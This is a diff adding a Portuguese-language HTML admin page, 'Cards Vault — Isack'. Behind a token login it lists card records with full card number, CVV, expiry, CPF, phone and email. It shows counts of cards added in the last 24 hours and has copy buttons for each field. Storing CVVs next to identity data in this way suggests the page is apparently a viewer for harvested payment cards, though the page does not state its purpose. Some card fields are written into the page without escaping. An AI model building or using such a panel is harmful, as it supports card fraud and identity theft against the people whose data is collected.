@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Cards Vault — Isack</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#f4f6f9;
+  --surface:#fff;
+  --border:#e8eaed;
+  --border2:#d4d7dc;
+  --text:#1a1d23;
+  --muted:#8a8f9a;
+  --muted2:#c5c9d1;
+  --accent:#2563eb;
+  --accent-bg:#eff4ff;
+  --green:#16a34a;
+  --green-bg:#f0fdf4;
+  --amber:#d97706;
+  --amber-bg:#fffbeb;
+  --red:#dc2626;
+  --red-bg:#fef2f2;
+}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px;-webkit-font-smoothing:antialiased}
+
+/* ── LOGIN ── */
+#loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh}
+.login-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:40px;width:380px;box-shadow:0 4px 24px rgba(0,0,0,.06)}
+.login-logo{display:flex;align-items:center;gap:10px;margin-bottom:28px}
+.login-icon{width:38px;height:38px;background:var(--text);border-radius:9px;display:flex;align-items:center;justify-content:center}
+.login-title{font-size:17px;font-weight:700}
+.login-sub{font-size:13px;color:var(--muted)}
+.login-label{display:block;font-size:12px;font-weight:600;color:var(--muted);margin-bottom:7px;letter-spacing:.2px}
+.login-input{width:100%;height:44px;border:1.5px solid var(--border);border-radius:8px;padding:0 14px;font-size:14px;font-family:inherit;outline:none;background:#fafbfc;transition:border-color .15s,box-shadow .15s;color:var(--text)}
+.login-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(37,99,235,.1);background:#fff}
+.login-btn{width:100%;height:44px;margin-top:14px;background:var(--text);border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .15s}
+.login-btn:hover{opacity:.88}
+.login-err{color:var(--red);font-size:12px;margin-top:10px;display:none}
+
+/* ── MAIN ── */
+#mainScreen{display:none}
+
+/* ── TOPBAR ── */
+.topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:0 28px;display:flex;align-items:center;justify-content:space-between;height:58px;position:sticky;top:0;z-index:20;box-shadow:0 1px 3px rgba(0,0,0,.04)}
+.topbar-brand{display:flex;align-items:center;gap:10px}
+.topbar-icon{width:32px;height:32px;background:var(--text);border-radius:8px;display:flex;align-items:center;justify-content:center}
+.topbar-name{font-size:15px;font-weight:700}
+.topbar-right{display:flex;align-items:center;gap:8px}
+.btn{height:36px;padding:0 16px;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;font-family:inherit;border:1.5px solid var(--border);background:var(--surface);color:var(--muted);transition:all .15s;display:inline-flex;align-items:center;gap:7px;white-space:nowrap}
+.btn:hover{border-color:var(--border2);color:var(--text);background:#f9fafc}
+
+/* ── STATS ── */
+.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border-bottom:1px solid var(--border)}
+.stat{background:var(--surface);padding:18px 24px}
+.stat-lbl{font-size:11px;font-weight:600;color:var(--muted2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px}
+.stat-val{font-size:24px;font-weight:700;color:var(--text);letter-spacing:-.5px}
+
+/* ── CONTENT ── */
+.content{padding:24px 28px;max-width:1400px}
+
+/* ── TOOLBAR ── */
+.toolbar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+.search-wrap{position:relative;flex:1;min-width:240px}
+.search-ico{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--muted2);pointer-events:none}
+.search{width:100%;height:38px;border:1.5px solid var(--border);border-radius:8px;padding:0 12px 0 36px;font-size:13px;font-family:inherit;outline:none;background:var(--surface);transition:border-color .15s,box-shadow .15s;color:var(--text)}
+.search:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(37,99,235,.08)}
+.search::placeholder{color:var(--muted2)}
+
+/* ── TABLE ── */
+.tbl-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.04)}
+table{width:100%;border-collapse:collapse}
+thead{background:#f8f9fb}
+th{padding:11px 18px;text-align:left;font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;border-bottom:1px solid var(--border);white-space:nowrap}
+td{padding:13px 18px;border-bottom:1px solid #f1f3f5;vertical-align:middle}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:#fafbfd}
+
+.cell-name{font-weight:600;font-size:13px;color:var(--text)}
+.cell-sub{font-size:12px;color:var(--muted);margin-top:2px}
+.cell-mono{font-family:'Courier New',monospace;font-size:12px;color:var(--muted)}
+
+.brand-pill{display:inline-flex;align-items:center;gap:7px;background:#f8f9fb;border:1px solid var(--border);border-radius:6px;padding:4px 10px}
+.brand-pill img{height:18px;object-fit:contain;display:block}
+.brand-pill .brand-txt{font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+
+.last4{font-family:'Courier New',monospace;font-size:13px;font-weight:500;display:flex;align-items:center;gap:4px}
+.dots{color:var(--muted2);letter-spacing:2px;font-size:11px}
+
+.exp-pill{display:inline-block;font-size:12px;font-weight:600;padding:3px 9px;border-radius:6px}
+.exp-ok  {background:var(--green-bg);color:var(--green)}
+.exp-warn{background:var(--amber-bg);color:var(--amber)}
+
+.dt{font-size:12px;color:var(--muted2)}
+.acts{display:flex;gap:5px}
+.act-btn{width:30px;height:30px;border:1.5px solid var(--border);border-radius:7px;background:var(--surface);cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--muted2);transition:all .15s;flex-shrink:0}
+.act-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-bg)}
+.empty{text-align:center;padding:64px;color:var(--muted2);font-size:13px}
+
+/* ── OVERLAY ── */
+.overlay{display:none;position:fixed;inset:0;background:rgba(15,20,30,.45);z-index:100;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
+.overlay.show{display:flex}
+
+/* ── DETAIL MODAL ── */
+.modal{background:var(--surface);border-radius:14px;width:100%;max-width:540px;max-height:90vh;overflow-y:auto;box-shadow:0 24px 64px rgba(0,0,0,.22);animation:pop .2s cubic-bezier(.34,1.4,.64,1)}
+@keyframes pop{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
+.modal-hd{display:flex;justify-content:space-between;align-items:center;padding:20px 24px;border-bottom:1px solid var(--border)}
+.modal-title{font-size:15px;font-weight:700}
+.modal-close{width:30px;height:30px;border:none;background:#f0f2f5;border-radius:7px;cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--muted);transition:all .15s;font-size:16px;font-family:inherit;line-height:1}
+.modal-close:hover{background:#e5e7eb;color:var(--text)}
+
+.vcard-wrap{padding:20px 24px 0}
+.vcard{background:linear-gradient(135deg,#1e293b 0%,#0f172a 100%);border-radius:12px;padding:22px 24px;position:relative;overflow:hidden;min-height:160px;box-shadow:0 8px 32px rgba(0,0,0,.25)}
+.vcard::before{content:'';position:absolute;top:-60px;right:-40px;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.05),transparent 70%)}
+.vcard::after{content:'';position:absolute;bottom:-40px;left:-20px;width:160px;height:160px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.04),transparent 70%)}
+.vc-brand{position:absolute;top:18px;right:20px;z-index:1}
+.vc-brand img{height:28px;object-fit:contain}
+.vc-brand .vc-brand-txt{font-size:12px;color:rgba(255,255,255,.5);font-weight:700;text-transform:uppercase;letter-spacing:1px}
+.vc-chip{width:42px;height:30px;background:linear-gradient(135deg,#d4a017,#f0c040,#c8900a);border-radius:5px;margin-bottom:20px;position:relative;z-index:1;box-shadow:inset 0 1px 0 rgba(255,255,255,.2)}
+.vc-num{font-family:'Courier New',monospace;font-size:16px;font-weight:500;letter-spacing:2.5px;color:rgba(255,255,255,.9);margin-bottom:16px;position:relative;z-index:1}
+.vc-num .vc-mask{color:rgba(255,255,255,.3);margin-right:8px}
+.vc-bot{display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1}
+.vc-lbl{font-size:9px;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:4px}
+.vc-val{font-family:'Courier New',monospace;font-size:13px;font-weight:500;color:rgba(255,255,255,.9);letter-spacing:1.5px}
+.vc-name{font-size:13px;font-weight:500;color:rgba(255,255,255,.9);letter-spacing:1px;text-transform:uppercase}
+.vc-tags{display:flex;gap:6px;margin-top:12px;flex-wrap:wrap}
+.vc-tag{font-size:10px;font-weight:600;padding:3px 9px;border-radius:5px;letter-spacing:.5px;text-transform:uppercase}
+.tag-gold{background:rgba(245,158,11,.15);color:#f59e0b;border:1px solid rgba(245,158,11,.25)}
+.tag-plat{background:rgba(99,102,241,.15);color:#818cf8;border:1px solid rgba(99,102,241,.25)}
+.tag-bank{background:rgba(255,255,255,.07);color:rgba(255,255,255,.5);border:1px solid rgba(255,255,255,.12)}
+.tag-type{background:rgba(34,197,94,.1);color:#4ade80;border:1px solid rgba(34,197,94,.2)}
+
+.field-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:20px 24px 24px}
+.field{display:flex;flex-direction:column;gap:4px}
+.field.full{grid-column:1/-1}
+.f-lbl{font-size:10px;font-weight:600;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px}
+.f-val{font-size:13px;color:var(--text);background:#f8f9fb;border:1px solid var(--border);border-radius:7px;padding:8px 12px;font-family:'Courier New',monospace;word-break:break-all;line-height:1.4}
+.copy-btn{margin-top:3px;font-size:11px;color:var(--muted);background:none;border:1px solid var(--border);border-radius:5px;padding:2px 8px;cursor:pointer;width:fit-content;font-family:inherit;transition:all .15s}
+.copy-btn:hover{border-color:var(--border2);color:var(--text)}
+.copy-btn.ok{color:var(--green);border-color:#86efac}
+
+@media(max-width:900px){
+  .topbar{padding:0 16px}
+  .stats-row{grid-template-columns:1fr 1fr}
+  .content{padding:16px}
+  .col-hide{display:none}
+}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="loginScreen">
+  <div class="login-card">
+    <div class="login-logo">
+      <div class="login-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect x="1" y="4" width="22" height="16" rx="2" stroke="#fff" stroke-width="2"/><path d="M1 10h22" stroke="#fff" stroke-width="2"/></svg>
+      </div>
+      <div>
+        <div class="login-title">Cards Vault</div>
+        <div class="login-sub">Acesso Isack</div>
+      </div>
+    </div>
+    <label class="login-label">Senha de acesso</label>
+    <input class="login-input" type="password" id="tokenInput" placeholder="Digite a senha…" onkeydown="if(event.key==='Enter')login()"/>
+    <button class="login-btn" onclick="login()">Entrar</button>
+    <div class="login-err" id="loginErr">Senha inválida. Tente novamente.</div>
+  </div>
+</div>
+
+<!-- MAIN -->
+<div id="mainScreen">
+  <div class="topbar">
+    <div class="topbar-brand">
+      <div class="topbar-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><rect x="1" y="4" width="22" height="16" rx="2" stroke="#fff" stroke-width="2"/><path d="M1 10h22" stroke="#fff" stroke-width="2"/></svg>
+      </div>
+      <span class="topbar-name">Cards Vault</span>
+    </div>
+    <div class="topbar-right">
+      <button class="btn" onclick="loadAll()">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M23 4v6h-6M1 20v-6h6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Atualizar
+      </button>
+      <button class="btn" onclick="logout()">Sair</button>
+    </div>
+  </div>
+
+  <div class="stats-row">
+    <div class="stat"><div class="stat-lbl">Total de cartões</div><div class="stat-val" id="statTotal">—</div></div>
+    <div class="stat"><div class="stat-lbl">Últimas 24h</div><div class="stat-val" id="statLast24">—</div></div>
+    <div class="stat"><div class="stat-lbl" id="sb1l">—</div><div class="stat-val" id="sb1v">0</div></div>
+    <div class="stat"><div class="stat-lbl" id="sb2l">—</div><div class="stat-val" id="sb2v">0</div></div>
+  </div>
+
+  <div class="content">
+    <div class="toolbar">
+      <div class="search-wrap">
+        <svg class="search-ico" width="14" height="14" viewBox="0 0 24 24" fill="none">
+          <circle cx="11" cy="11" r="8" stroke="currentColor" stroke-width="2"/>
+          <path d="M21 21l-4.35-4.35" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <input class="search" id="searchInput" placeholder="Buscar nome, e-mail, bandeira, final…" oninput="debounce()"/>
+      </div>
+    </div>
+
+    <div class="tbl-card">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Nome / E-mail</th>
+            <th class="col-hide">CPF</th>
+            <th>Bandeira</th>
+            <th>Final</th>
+            <th>Validade</th>
+            <th class="col-hide">Cadastro</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="tbody">
+          <tr><td colspan="8" class="empty">Carregando…</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- DETALHE -->
+<div class="overlay" id="detailModal" onclick="if(event.target===this)closeDetail()">
+  <div class="modal">
+    <div class="modal-hd">
+      <span class="modal-title">Dados do cartão</span>
+      <button class="modal-close" onclick="closeDetail()">✕</button>
+    </div>
+    <div class="vcard-wrap" id="vcardWrap"></div>
+    <div class="field-grid" id="detailGrid"></div>
+  </div>
+</div>
+
+<script>
+const LOGOS = {
+  visa:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/visa.svg',
+  mastercard: 'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/mastercard.svg',
+  amex:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/amex.svg',
+  elo:        'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/elo.svg',
+  hipercard:  'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/hipercard.svg',
+};
+
+let _tok = sessionStorage.getItem('isk_tok') || '';
+const _c = {};
+let _t = null;
+
+function brandKey(b){ const s=(b||'').toLowerCase(); if(s.includes('visa'))return'visa'; if(s.includes('master'))return'mastercard'; if(s.includes('amex'))return'amex'; if(s.includes('elo'))return'elo'; if(s.includes('hiper'))return'hipercard'; return''; }
+
+async function login(){
+  const t=document.getElementById('tokenInput').value.trim(); if(!t)return;
+  const r=await fetch('/api/isack/stats',{headers:{'x-admin-token':t}});
+  if(r.ok){_tok=t;sessionStorage.setItem('isk_tok',t);document.getElementById('loginErr').style.display='none';showMain();}
+  else document.getElementById('loginErr').style.display='block';
+}
+function logout(){_tok='';sessionStorage.removeItem('isk_tok');document.getElementById('mainScreen').style.display='none';document.getElementById('loginScreen').style.display='flex';}
+function showMain(){document.getElementById('loginScreen').style.display='none';document.getElementById('mainScreen').style.display='block';loadAll();}
+if(_tok)fetch('/api/isack/stats',{headers:{'x-admin-token':_tok}}).then(r=>r.ok?showMain():logout()).catch(()=>{});
+
+async function loadAll(){await Promise.all([loadStats(),loadCards()]);}
+
+async function loadStats(){
+  const r=await fetch('/api/isack/stats',{headers:{'x-admin-token':_tok}});if(!r.ok)return;
+  const d=await r.json();
+  document.getElementById('statTotal').textContent=d.total;
+  document.getElementById('statLast24').textContent=d.last24;
+  const b=d.brands||[];
+  [[0,'sb1l','sb1v'],[1,'sb2l','sb2v']].forEach(([i,l,v])=>{
+    const x=b[i];document.getElementById(l).textContent=x?cap(x.brand):'—';document.getElementById(v).textContent=x?x.count:'0';
+  });
+}
+
+async function loadCards(q){
+  const r=await fetch('/api/isack/cards'+(q?'?search='+encodeURIComponent(q):''),{headers:{'x-admin-token':_tok}});if(!r.ok)return;
+  const d=await r.json();renderTable(d.cards||[]);
+}
+function debounce(){clearTimeout(_t);_t=setTimeout(()=>loadCards(document.getElementById('searchInput').value.trim()||undefined),320);}
+
+function renderTable(cards){
+  const tb=document.getElementById('tbody');
+  if(!cards.length){tb.innerHTML='<tr><td colspan="8" class="empty">Nenhum cartão encontrado.</td></tr>';return;}
+  cards.forEach(c=>_c[c.id]=c);
+  tb.innerHTML=cards.map((c,i)=>{
+    const bk=brandKey(c.brand);
+    const logo=LOGOS[bk]?`<img src="${LOGOS[bk]}" alt="${c.brand||''}"/>`:`<span class="brand-txt">${esc(c.brand||'?')}</span>`;
+    const [mm='',yy='']=(c.expiry||'').split('/');
+    let ec='ok'; if(mm&&yy){const d=(parseInt('20'+yy)-new Date().getFullYear())*12+parseInt(mm)-new Date().getMonth()-1;if(d<=3)ec='warn';}
+    const dt=c.created_at?new Date(c.created_at).toLocaleDateString('pt-BR',{day:'2-digit',month:'2-digit',year:'2-digit'}):'—';
+    return `<tr>
+      <td style="color:var(--muted2);font-size:12px;font-family:monospace">${i+1}</td>
+      <td><div class="cell-name">${esc(c.nome||'—')}</div><div class="cell-sub">${esc(c.email||'—')}</div></td>
+      <td class="cell-mono col-hide">${esc(c.cpf||'—')}</td>
+      <td><span class="brand-pill">${logo}</span></td>
+      <td><span class="last4"><span class="dots">••••</span>${esc(c.last4||'????')}</span></td>
+      <td><span class="exp-pill exp-${ec}">${esc(c.expiry||'—')}</span></td>
+      <td class="dt col-hide">${dt}</td>
+      <td><div class="acts">
+        <button class="act-btn" onclick="openDetail('${c.id}')" title="Ver">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/><path d="M1 12C3 7 7 4 12 4s9 3 11 8c-2 5-6 8-11 8S3 17 1 12z" stroke="currentColor" stroke-width="2"/></svg>
+        </button>
+      </div></td>
+    </tr>`;
+  }).join('');
+}
+
+function openDetail(id){
+  const c=_c[id];if(!c)return;
+  const bk=brandKey(c.brand);
+  const vcLogo=LOGOS[bk]?`<img src="${LOGOS[bk]}" alt="${c.brand||''}"/>`:`<span class="vc-brand-txt">${esc(c.brand||'CARD')}</span>`;
+  const num=(c.card_number||'').replace(/\D/g,'');
+  let numHtml='';
+  if(num.length>=12){const g=num.match(/.{1,4}/g)||[];numHtml=g.map(x=>`<span>${x}</span>`).join(' ');}
+  else numHtml=`<span class="vc-mask">•••• •••• ••••</span> ${esc(c.last4||'????')}`;
+  const lvl=(c.card_level||'').toUpperCase();
+  const lvlTag=lvl?`<span class="vc-tag ${lvl.includes('PLAT')||lvl.includes('INF')||lvl.includes('SIGN')||lvl.includes('BLACK')?'tag-plat':'tag-gold'}">${lvl}</span>`:'';
+  const typeTag=c.card_type?`<span class="vc-tag tag-type">${c.card_type.toUpperCase()}</span>`:'';
+  const bankTag=c.bank?`<span class="vc-tag tag-bank">${esc(c.bank)}</span>`:'';
+  document.getElementById('vcardWrap').innerHTML=`
+    <div class="vcard">
+      <div class="vc-brand">${vcLogo}</div>
+      <div class="vc-chip"></div>
+      <div class="vc-num">${numHtml}</div>
+      <div class="vc-bot">
+        <div><div class="vc-lbl">Titular</div><div class="vc-name">${esc((c.nome||'—').toUpperCase())}</div></div>
+        <div style="text-align:right"><div class="vc-lbl">Validade</div><div class="vc-val">${esc(c.expiry||'—')}</div></div>
+      </div>
+    </div>
+    ${lvlTag||typeTag||bankTag?`<div class="vc-tags">${lvlTag}${typeTag}${bankTag}</div>`:''}
+  `;
+  const dt=c.created_at?new Date(c.created_at).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}):'—';
+  const fields=[['Nome',c.nome,'full'],['E-mail',c.email,'full'],['CPF',c.cpf,''],['Telefone',c.telefone,''],['Número',c.card_number,'full'],['CVV',c.cvv,''],['Validade',c.expiry,''],['Banco',c.bank,''],['Nível',c.card_level,''],['Tipo',c.card_type,''],['Cadastro',dt,'full']];
+  document.getElementById('detailGrid').innerHTML=fields.filter(([,v])=>v).map(([l,v,s])=>`
+    <div class="field${s?' '+s:''}">
+      <div class="f-lbl">${l}</div>
+      <div class="f-val">${esc(v)}</div>
+      <button class="copy-btn" onclick="cp(this,'${esc(String(v))}')">copiar</button>
+    </div>`).join('');
+  document.getElementById('detailModal').classList.add('show');
+}
+function closeDetail(){document.getElementById('detailModal').classList.remove('show');}
+
+function cp(btn,text){navigator.clipboard.writeText(text).then(()=>{btn.textContent='✓ copiado';btn.classList.add('ok');setTimeout(()=>{btn.textContent='copiar';btn.classList.remove('ok');},1800);});}
+
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+function cap(s){return s?s.charAt(0).toUpperCase()+s.slice(1):s;}
+document.addEventListener('keydown',e=>{if(e.key==='Escape')closeDetail();});
+</script>
+</body>
+</html>
